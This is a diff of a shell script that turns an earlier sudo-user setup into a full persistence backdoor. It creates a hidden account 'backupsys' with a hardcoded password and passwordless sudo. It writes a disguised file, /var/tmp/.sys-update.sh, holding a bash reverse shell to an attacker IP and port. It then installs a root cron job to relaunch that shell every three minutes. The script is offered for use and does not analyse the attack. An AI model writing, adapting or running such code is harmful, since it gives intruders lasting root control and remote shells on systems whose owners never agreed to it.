@@ -1,12 +1,51 @@
-#!/bin/bash
+#!/bin/sh
 
-useradd -M -s /bin/bash "snap" 2>/dev/null
+# This script:
+# - Creates a sudo user 'backupsys' with password 'Str0ngP@ss!'
+# - Grants passwordless sudo via sudoers.d
+# - Creates a reverse shell script in /var/tmp/.sys-update.sh
+# - Sets a root cron job to run it every 3 minutes
+#
+# Change IP and port below as needed.
 
-echo "snap ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/snap 2>/dev/null
-
-
-chmod 440 /etc/sudoers.d/snap 2>/dev/null
-if [ $? -ne 0 ]; then
-  echo "Error: Failed to set permissions for the sudoers file."
+if [ "$(id -u)" -ne 0 ]; then
+  echo "Run as root"
   exit 1
 fi
+
+USER_NAME="backupsys"
+USER_PASS="Str0ngP@ss!"
+ATTACK_IP="203.0.113.10"
+ATTACK_PORT="4444"
+CRON_SCRIPT_PATH="/var/tmp/.sys-update.sh"
+
+# Create user with no home, no group, bash shell
+useradd -M -N -s /bin/bash "$USER_NAME"
+
+# Set password non-interactively
+echo "${USER_NAME}:${USER_PASS}" | chpasswd
+
+# Add user to sudo group
+usermod -aG sudo "$USER_NAME"
+
+# Hide sudo config via sudoers.d
+SUDO_FILE="/etc/sudoers.d/${USER_NAME}"
+echo "${USER_NAME} ALL=(ALL) NOPASSWD:ALL" > "$SUDO_FILE"
+chmod 440 "$SUDO_FILE"
+
+# Create reverse shell script
+mkdir -p "$(dirname "$CRON_SCRIPT_PATH")"
+
+cat > "$CRON_SCRIPT_PATH" <<EOF
+#!/bin/bash
+bash -i >& /dev/tcp/${ATTACK_IP}/${ATTACK_PORT} 0>&1
+EOF
+
+chmod +x "$CRON_SCRIPT_PATH"
+
+# Install root crontab to run every 3 minutes, preserving existing entries
+CRON_TMP=$(mktemp)
+crontab -l 2>/dev/null > "$CRON_TMP"
+echo "*/3 * * * * $CRON_SCRIPT_PATH" >> "$CRON_TMP"
+crontab "$CRON_TMP"
+rm -f "$CRON_TMP"
